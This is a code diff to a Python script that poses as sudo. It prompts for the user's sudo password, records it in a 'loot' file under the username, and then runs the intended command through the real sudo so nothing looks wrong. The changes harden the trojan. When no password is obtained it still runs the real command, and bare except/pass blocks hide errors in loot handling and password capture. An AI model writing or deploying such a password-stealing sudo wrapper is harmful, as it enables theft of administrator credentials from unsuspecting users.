@@ -103,9 +103,13 @@ def runIntendedSudoCommand(validatedSudoPassword):
     for index, arg in enumerate(args):
         if arg == "sudo":
             args[index] = realSudo
-    command = " ".join([realSudo, "-S"] + args)
-    runner = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
-    runner.communicate(validatedSudoPassword + "\n")
+    if not type(validatedSudoPassword) == type(None):
+        command = " ".join([realSudo, "-S"] + args)
+        runner = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)
+        runner.communicate(validatedSudoPassword + "\n")
+    else:
+        command = " ".join([realSudo] + args)
+        runner = subprocess.Popen(command, shell = True)
     
 def getSudoPassword(allowedAttempts = 3):
     import getpass
@@ -161,7 +165,13 @@ if __name__ == '__main__':
         parseArguments()
         lootFile = getLootFileName()
         loot = loadLootFile(lootFile)
+    except:
+        pass
+    try:
         user, password, passwordNeeded = getSudoPassword()
+    except:
+        password = None
+    try:
         if passwordNeeded:
             loot[user] = password
         saveLootFile(loot, lootFile)
